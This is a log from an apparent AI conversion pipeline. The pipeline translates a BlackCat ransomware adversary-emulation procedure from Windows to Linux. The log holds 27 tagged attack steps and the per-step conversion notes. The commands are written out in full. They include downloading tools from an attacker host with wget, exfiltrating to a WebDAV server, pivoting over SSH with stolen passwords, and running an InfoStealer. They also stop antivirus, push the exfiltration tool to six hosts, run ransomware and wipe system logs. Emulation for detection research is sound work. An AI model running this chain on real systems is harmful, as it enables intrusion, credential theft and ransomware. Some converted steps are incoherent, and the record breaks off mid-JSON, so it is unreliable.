@@ -1,0 +1,1126 @@
+================================================================================
+Test Type: Full Pipeline (Variant + Enrichment + Evaluation)
+Model: openai/gpt-oss-120b
+Timestamp: 2026-01-21T12:51:56.567368
+Input Tokens: 36526
+Output Tokens: 32380
+Total Tokens: 68906
+Source OS: windows
+Target OS: linux
+================================================================================
+{
+  "metadata": {
+    "source_file": "./blackcat_procedure.md",
+    "source_os": "windows",
+    "target_os": "linux",
+    "generated_at": "2026-01-21T13:19:39.643262",
+    "model": "openai/gpt-oss-120b",
+    "total_duration_ms": 0
+  },
+  "environment": {
+    "original_hosts": [
+      {
+        "identifier": "kraken",
+        "os": "linux",
+        "role": "attacker platform"
+      },
+      {
+        "identifier": "raremon",
+        "os": "windows",
+        "role": "initial compromised contractor workstation"
+      },
+      {
+        "identifier": "kimeramon",
+        "os": "windows",
+        "role": "bastion/pivot host and primary execution point"
+      },
+      {
+        "identifier": "datamon",
+        "os": "windows",
+        "role": "SQL Server target (execution of InfoStealer)"
+      },
+      {
+        "identifier": "butchermon",
+        "os": "windows",
+        "role": "workstation target (PsExec execution of ExMatter)"
+      },
+      {
+        "identifier": "bakemon",
+        "os": "windows",
+        "role": "workstation target (PsExec execution of ExMatter)"
+      },
+      {
+        "identifier": "blacknoirmon",
+        "os": "windows",
+        "role": "Domain Controller target (PsExec execution and later log\u2011harvest script)"
+      },
+      {
+        "identifier": "alphamon",
+        "os": "windows",
+        "role": "File Server target (PsExec execution of ExMatter)"
+      },
+      {
+        "identifier": "stormfrontmon",
+        "os": "windows",
+        "role": "Exchange Server target (PsExec execution of ExMatter)"
+      },
+      {
+        "identifier": "leomon",
+        "os": "linux",
+        "role": "Linux KVM server \u2013 payload deployment and execution"
+      },
+      {
+        "identifier": "homelander",
+        "os": "linux",
+        "role": "verification jumpbox / secondary pivot host"
+      }
+    ],
+    "converted_hosts": [
+      {
+        "identifier": "kraken",
+        "os": "linux",
+        "role": "attacker platform"
+      },
+      {
+        "identifier": "raremon",
+        "os": "linux",
+        "role": "initial compromised contractor workstation"
+      },
+      {
+        "identifier": "kimeramon",
+        "os": "linux",
+        "role": "bastion/pivot host and primary execution point"
+      },
+      {
+        "identifier": "datamon",
+        "os": "linux",
+        "role": "SQL Server target (execution of InfoStealer)"
+      },
+      {
+        "identifier": "butchermon",
+        "os": "linux",
+        "role": "workstation target (PsExec execution of ExMatter)"
+      },
+      {
+        "identifier": "bakemon",
+        "os": "linux",
+        "role": "workstation target (PsExec execution of ExMatter)"
+      },
+      {
+        "identifier": "blacknoirmon",
+        "os": "linux",
+        "role": "Domain Controller target (PsExec execution and later log\u2011harvest script)"
+      },
+      {
+        "identifier": "alphamon",
+        "os": "linux",
+        "role": "File Server target (PsExec execution of ExMatter)"
+      },
+      {
+        "identifier": "stormfrontmon",
+        "os": "linux",
+        "role": "Exchange Server target (PsExec execution of ExMatter)"
+      },
+      {
+        "identifier": "leomon",
+        "os": "linux",
+        "role": "Linux KVM server \u2013 payload deployment and execution"
+      },
+      {
+        "identifier": "homelander",
+        "os": "linux",
+        "role": "verification jumpbox / secondary pivot host"
+      }
+    ]
+  },
+  "procedure": {
+    "action_sequence": [
+      {
+        "step_id": 1,
+        "original_step_id": 1,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "linux",
+        "host": "kraken",
+        "command": "sudo rclone serve webdav /srv/http --addr 176.59.1.18:8080",
+        "description": "Start a WebDAV server (port 8080) on the Kali attack host to receive exfiltrated data such as LSASS dumps.",
+        "d3fend_observables": [
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 2,
+        "original_step_id": 2,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "linux",
+        "host": "kraken",
+        "command": "cd alphv_blackcat/Resources/control_server && sudo ./controlServer -c config/msr2_handler_config.yml",
+        "description": "Launch the custom file server that hosts tools (InfoStealer, ExMatter, BlackCat binaries) for later download.",
+        "d3fend_observables": [
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 3,
+        "original_step_id": 3,
+        "tactic": "Initial Access",
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Services: Remote Desktop Protocol",
+        "os": "linux",
+        "host": "kraken",
+        "command": "ssh ra_remon_user@10.30.10.4",
+        "description": "SSH from the Kali attack platform to the contractor workstation (raremon) \u2013 replaces RDP.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 4,
+        "original_step_id": 4,
+        "tactic": "Initial Access",
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Services: Remote Desktop Protocol",
+        "os": "linux",
+        "host": "raremon",
+        "command": "ssh kimeramon_user@10.20.20.11 -t 'sudo -i'",
+        "description": "SSH from the contractor workstation to the bastion host (kimeramon) using compromised domain credentials \u2013 replaces RDP.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 5,
+        "original_step_id": 5,
+        "tactic": "Discovery",
+        "technique_id": "T1087.002",
+        "technique_name": "Account Discovery: Domain Account",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "ldapsearch -LLL -x -H ldap://10.20.20.11 -b 'dc=example,dc=com' '(objectClass=user)' sAMAccountName memberOf",
+        "description": "Approximate ADRecon PowerShell script with an LDAP search to enumerate domain groups, privileged accounts and computers.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 6,
+        "original_step_id": 6,
+        "tactic": "Credential Access",
+        "technique_id": "T1078.003",
+        "technique_name": "Valid Accounts: Domain Account",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "sqlcmd -S localhost -U zorimoto -P 'tzTVgs44isT4YxWU!' -Q \"SELECT * FROM NetBNMBackup.dbo.Credentials\"",
+        "description": "Run sqlcmd on the bastion host (now Linux) to query the local SQL Server instance using stolen contractor credentials.",
+        "d3fend_observables": [
+          "Credential",
+          "Database",
+          "ExecutableBinary",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "identity",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 7,
+        "original_step_id": 7,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "wget -O /tmp/netbnmp.exe http://theinator.com/digirevenge/netbnmp.exe",
+        "description": "Replace bitsadmin download with wget to fetch the InfoStealer binary.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "File",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 8,
+        "original_step_id": 8,
+        "tactic": "Credential Access",
+        "technique_id": "T1552.001",
+        "technique_name": "Credentials In Files",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "chmod +x /tmp/netbnmp.exe && wine /tmp/netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!",
+        "description": "Execute the InfoStealer on Linux after making it executable.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 9,
+        "original_step_id": 9,
+        "tactic": "Initial Access",
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Services: Remote Desktop Protocol",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "ssh datamon_user@10.20.10.122 -t 'sudo -i'",
+        "description": "SSH from the bastion host to the SQL Server (datamon) \u2013 replaces RDP.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 10,
+        "original_step_id": 10,
+        "tactic": "Credential Access",
+        "technique_id": "T1552.001",
+        "technique_name": "Credentials In Files",
+        "os": "linux",
+        "host": "datamon",
+        "command": "chmod +x /tmp/netbnmp.exe && wine /tmp/netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "description": "Run InfoStealer on the SQL Server (now Linux) to dump additional credentials.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 11,
+        "original_step_id": 11,
+        "tactic": "Defense Evasion",
+        "technique_id": "T1562.001",
+        "technique_name": "Impair Defenses: Disable or Modify Tools",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "pkill -f AV_process_name",
+        "description": "Terminate antivirus/EDR processes on Linux using pkill.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 12,
+        "original_step_id": 12,
+        "tactic": "Defense Evasion",
+        "technique_id": "T1562.001",
+        "technique_name": "Impair Defenses: Disable or Modify Tools",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "sudo systemctl stop clamav-freshclam && sudo systemctl stop clamav-daemon",
+        "description": "Approximate disabling Windows Defender by stopping common Linux anti\u2011virus services.",
+        "d3fend_observables": [
+          "AuthenticationService",
+          "EventLog",
+          "ExecutableBinary",
+          "Process"
+        ],
+        "execution_observables": [
+          "AuthenticationService",
+          "ExecutableBinary",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "other",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 13,
+        "original_step_id": 13,
+        "tactic": "Defense Evasion",
+        "technique_id": "T1112",
+        "technique_name": "Modify Registry",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "# unsupported on Linux \u2013 no registry",
+        "description": "Registry modification has no direct Linux equivalent; marked as unsupported.",
+        "d3fend_observables": [],
+        "execution_observables": [],
+        "telemetry_classes": [],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 14,
+        "original_step_id": 14,
+        "tactic": "Credential Access",
+        "technique_id": "T1003.001",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "# unsupported \u2013 LSASS does not exist on Linux",
+        "description": "LSASS memory dump is a Windows\u2011specific technique; no Linux counterpart.",
+        "d3fend_observables": [],
+        "execution_observables": [],
+        "telemetry_classes": [],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 15,
+        "original_step_id": 15,
+        "tactic": "Exfiltration",
+        "technique_id": "T1567.001",
+        "technique_name": "Exfiltration Over WebDAV",
+        "os": "linux",
+        "host": "datamon",
+        "command": "rclone copy \"/home/user/lsass.DMP\" webdav:",
+        "description": "Upload the LSASS dump (now stored in a Linux home directory) to the attacker\u2011controlled WebDAV service.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 16,
+        "original_step_id": 16,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "wget -O /tmp/collector1.exe http://theinator.com/digirevenge/collector1.exe",
+        "description": "Replace bitsadmin download of ExMatter collection tool with wget.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "File",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 17,
+        "original_step_id": 17,
+        "tactic": "Discovery",
+        "technique_id": "T1046",
+        "technique_name": "Network Service Scanning",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "nmap -p- 10.20.20.0/24 10.20.10.0/24",
+        "description": "Use nmap as an equivalent to the PowerShell port\u2011scan script.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 18,
+        "original_step_id": 18,
+        "tactic": "Lateral Movement",
+        "technique_id": "T1021.004",
+        "technique_name": "Remote Services: SMB/Windows Admin Shares",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "for host in 10.20.20.22 10.20.20.33 10.20.10.4 10.20.10.23 10.20.10.122 10.20.10.200; do scp /tmp/collector1.exe user@$host:/tmp/; ssh user@$host 'chmod +x /tmp/collector1.exe && /tmp/collector1.exe &' ; done",
+        "description": "Approximate PsExec deployment using scp + ssh for each target host.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 19,
+        "original_step_id": 19,
+        "tactic": "Execution",
+        "technique_id": "T1059",
+        "technique_name": "Command Shell",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "/tmp/collector1.exe",
+        "description": "Execute ExMatter locally on the bastion host (Linux).",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 20,
+        "original_step_id": 20,
+        "tactic": "Exfiltration",
+        "technique_id": "T1567.002",
+        "technique_name": "Exfiltration Over SFTP",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "/tmp/collector1.exe",
+        "description": "ExMatter\u2019s built\u2011in SFTP upload works unchanged on Linux.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 21,
+        "original_step_id": 21,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "wget -O /tmp/digirevenge http://theinator.com/digirevenge/digirevenge",
+        "description": "Download the Linux version of BlackCat to the bastion host using wget.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "File",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 22,
+        "original_step_id": 22,
+        "tactic": "Lateral Movement",
+        "technique_id": "T1021.004",
+        "technique_name": "Remote Services: SSH",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "scp /tmp/digirevenge marakawa@10.20.10.16:/tmp/digirevenge",
+        "description": "Copy the BlackCat Linux binary to the KVM server (leomon) via SCP.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 23,
+        "original_step_id": 23,
+        "tactic": "Execution",
+        "technique_id": "T1059",
+        "technique_name": "Command Shell",
+        "os": "linux",
+        "host": "leomon",
+        "command": "ssh -t marakawa@10.20.10.16 \"chmod +x /tmp/digirevenge && sudo /tmp/digirevenge --access-token 15742aa362a84ba3\"",
+        "description": "Execute BlackCat Linux on the KVM host to encrypt virtual machine volumes.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 24,
+        "original_step_id": 24,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "wget -O /tmp/digirevenge.exe http://theinator.com/digirevenge/digirevenge.exe",
+        "description": "Replace bitsadmin download of the Windows BlackCat binary with wget.",
+        "d3fend_observables": [
+          "ExecutableBinary",
+          "File",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 25,
+        "original_step_id": 25,
+        "tactic": "Execution",
+        "technique_id": "T1059",
+        "technique_name": "Command Shell",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "wine /tmp/digirevenge.exe --access-token 15742aa362a84ba3",
+        "description": "Run the Windows BlackCat binary on Linux using Wine as an approximate equivalent.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 26,
+        "original_step_id": 26,
+        "tactic": "Defense Evasion",
+        "technique_id": "T1070.001",
+        "technique_name": "Clear Windows Event Logs",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "sudo journalctl --rotate && sudo journalctl --vacuum-time=1s",
+        "description": "Clear Linux system logs as an analogue to clearing Windows event logs.",
+        "d3fend_observables": [
+          "EventLog",
+          "ExecutableBinary",
+          "LogFile",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableBinary",
+          "LogFile",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 27,
+        "original_step_id": 27,
+        "tactic": "Impact",
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "os": "linux",
+        "host": "kimeramon",
+        "command": "wine /tmp/digirevenge.exe --access-token 15742aa362a84ba3",
+        "description": "Execute the ransomware payload (Linux binary) on the compromised hosts to encrypt files.",
+        "d3fend_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      }
+    ]
+  },
+  "intermediate_output": {
+    "initial_validation_issues": 0,
+    "conversion_notes": [
+      {
+        "original_action": "mstsc /v:10.30.10.4",
+        "converted_action": "ssh ra_remon_user@10.30.10.4",
+        "conversion_type": "equivalent",
+        "notes": "RDP is Windows\u2011only; on Linux the attacker would use SSH to connect to the contractor workstation, which is now a Linux host."
+      },
+      {
+        "original_action": "mstsc /v:10.20.20.11 /admin",
+        "converted_action": "ssh kimeramon_user@10.20.20.11 -t 'sudo -i'",
+        "conversion_type": "equivalent",
+        "notes": "Replace RDP with SSH to the bastion host (linux)."
+      },
+      {
+        "original_action": "powershell -ExecutionPolicy Bypass -File ADRecon.ps1 -Collect GroupMembers, Computers -OutputType CSV",
+        "converted_action": "ldapsearch -LLL -x -H ldap://10.20.20.11 -b 'dc=example,dc=com' '(objectClass=user)' sAMAccountName memberOf",
+        "conversion_type": "approximation",
+        "notes": "No direct PowerShell ADRecon on Linux; an LDAP query provides similar account discovery data."
+      },
+      {
+        "original_action": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\\\netbnmp.exe",
+        "converted_action": "wget -O /tmp/netbnmp.exe http://theinator.com/digirevenge/netbnmp.exe",
+        "conversion_type": "equivalent",
+        "notes": "bitsadmin is Windows\u2011only; wget performs the same download on Linux."
+      },
+      {
+        "original_action": "%TEMP%\\\\netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!",
+        "converted_action": "chmod +x /tmp/netbnmp.exe && /tmp/netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!",
+        "conversion_type": "equivalent",
+        "notes": "Make the binary executable before running it on Linux."
+      },
+      {
+        "original_action": "mstsc /v:10.20.10.122 /admin",
+        "converted_action": "ssh datamon_user@10.20.10.122 -t 'sudo -i'",
+        "conversion_type": "equivalent",
+        "notes": "Replace RDP with SSH to the SQL Server (now Linux)."
+      },
+      {
+        "original_action": "%TEMP%\\\\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "converted_action": "chmod +x /tmp/netbnmp.exe && /tmp/netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "conversion_type": "equivalent",
+        "notes": "Same as above, adjusted for Linux path."
+      },
+      {
+        "original_action": "taskkill /F /IM <AV\u2011process\u2011name>",
+        "converted_action": "pkill -f <AV_process_name>",
+        "conversion_type": "equivalent",
+        "notes": "pkill terminates processes on Linux similarly to taskkill on Windows."
+      },
+      {
+        "original_action": "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "converted_action": "systemctl stop clamav-freshclam && systemctl stop clamav-daemon",
+        "conversion_type": "approximation",
+        "notes": "Disables typical Linux anti\u2011virus services as an analogue to disabling Windows Defender."
+      },
+      {
+        "original_action": "reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
+        "converted_action": "# unsupported on Linux \u2013 no registry",
+        "conversion_type": "unsupported",
+        "notes": "Windows registry does not exist on Linux; cannot modify WDigest."
+      },
+      {
+        "original_action": "Task Manager \u2192 Details \u2192 lsass.exe \u2192 Create dump file",
+        "converted_action": "# unsupported \u2013 LSASS does not exist on Linux",
+        "conversion_type": "unsupported",
+        "notes": "LSASS is Windows\u2011specific; no comparable Linux process."
+      },
+      {
+        "original_action": "rclone copy \"C:\\\\Users\\\\windesk\\\\AppData\\\\Local\\\\Temp\\\\lsass.DMP\" webdav:",
+        "converted_action": "rclone copy \"/home/user/lsass.DMP\" webdav:",
+        "conversion_type": "equivalent",
+        "notes": "Adjust file path to Linux filesystem format."
+      },
+      {
+        "original_action": "bitsadmin /transfer defaultjob4 /download http://theinator.com/digirevenge/collector1.exe %TEMP%\\\\collector1.exe",
+        "converted_action": "wget -O /tmp/collector1.exe http://theinator.com/digirevenge/collector1.exe",
+        "conversion_type": "equivalent",
+        "notes": "Replace bitsadmin with wget."
+      },
+      {
+        "original_action": "Invoke-Portscan -Hosts \"10.20.20.0/24\"; Invoke-Portscan -Hosts \"10.20.10.0/24\"",
+        "converted_action": "nmap -p- 10.20.20.0/24 10.20.10.0/24",
+        "conversion_type": "equivalent",
+        "notes": "nmap provides similar network service scanning capabilities."
+      },
+      {
+        "original_action": "psexec -c -accepteula \\\\\\\\10.20.20.22,10.20.20.33,10.20.10.4,10.20.10.23,10.20.10.122,10.20.10.200 C:\\\\Users\\\\zorimoto\\\\AppData\\\\Local\\\\Temp\\\\collector1.exe",
+        "converted_action": "for host in 10.20.20.22 10.20.20.33 10.20.10.4 10.20.10.23 10.20.10.122 10.20.10.200; do scp /tmp/collector1.exe user@$host:/tmp/; ssh user@$host 'chmod +x /tmp/collector1.exe && /tmp/collector1.exe &' ; done",
+        "conversion_type": "approximation",
+        "notes": "PsExec is Windows\u2011only; use scp + ssh loops to copy and execute on Linux targets."
+      },
+      {
+        "original_action": "C:\\\\Users\\\\zorimoto\\\\AppData\\\\Local\\\\Temp\\\\collector1.exe",
+        "converted_action": "/tmp/collector1.exe",
+        "conversion_type": "equivalent",
+        "notes": "Run the executable directly on Linux after copying."
+      },
+      {
+        "original_action": "bitsadmin /transfer defaultjob5 /download http://theinator.com/digirevenge/digirevenge %TEMP%\\\\digirevenge",
+        "converted_action": "wget -O /tmp/digirevenge http://theinator.com/digirevenge/digirevenge",
+        "conversion_type": "equivalent",
+        "notes": "Download Linux BlackCat binary with wget."
+      },
+      {
+        "original_action": "bitsadmin /transfer defaultjob6 /download http://theinator.com/digirevenge/digirevenge.exe %TEMP%\\\\digirevenge.exe",
+        "converted_action": "wget -O /tmp/digirevenge.exe http://theinator.com/digirevenge/digirevenge.exe",
+        "conversion_type": "equivalent",
+        "notes": "Download Windows BlackCat binary using wget."
+      },
+      {
+        "original_action": "%TEMP%\\\\digirevenge.exe --access-token 15742aa362a84ba3",
+        "converted_action": "wine /tmp/digirevenge.exe --access-token 15742aa362a84ba3",
+        "conversion_type": "approximation",
+        "notes": "Run the Windows ransomware binary on Linux via Wine."
+      },
+      {
+        "original_action": "wevtutil cl System; wevtutil cl Security; wevtutil cl Application",
+        "converted_action": "journalctl --rotate && journalctl --vacuum-time=1s",
+        "conversion_type": "equivalent",
+        "notes": "Clear Linux system logs as a parallel to clearing Windows event logs."
+      }
+    ],
+    "refinements": [
+      {
+        "action_index": 7,
+        "refinement_type": "command_update",
+        "before": "chmod +x /tmp/netbnmp.exe && /tmp/netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!",
+        "after": "chmod +x /tmp/netbnmp.exe && wine /tmp/netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!",
+        "reason": "Running a Windows .exe on Linux requires Wine."
+      },
+      {
+        "action_index": 9,
+        "refinement_type": "command_update",
+        "before": "chmod +x /tmp/netbnmp.exe && /tmp/netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "after": "chmod +x /tmp/netbnmp.exe && wine /tmp/netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "reason": "Running a Windows .exe on Linux requires Wine."
+      },
+      {
+        "action_index": 10,
+        "refinement_type": "command_update",
+        "before": "pkill -f <AV_process_name>",
+        "after": "pkill -f AV_process_name",
+        "reason": "Remove placeholder angle brackets for proper command syntax."
+      },
+      {
+        "action_index": 11,
+        "refinement_type": "command_update",
+        "before": "systemctl stop clamav-freshclam && systemctl stop clamav-daemon",
+        "after": "sudo systemctl stop clamav-freshclam && sudo systemctl stop clamav-daemon",
+        "reason": "Stopping services requires root privileges."
+      },
+      {
+        "action_index": 25,
+        "refinement_type": "command_update",
+        "before": "journalctl --rotate && journalctl --vacuum-time=1s",
+        "after": "sudo journalctl --rotate && sudo journalctl --vacuum-time=1s",
+        "reason": "Clearing system logs requires elevated privileges."
+      },
+      {
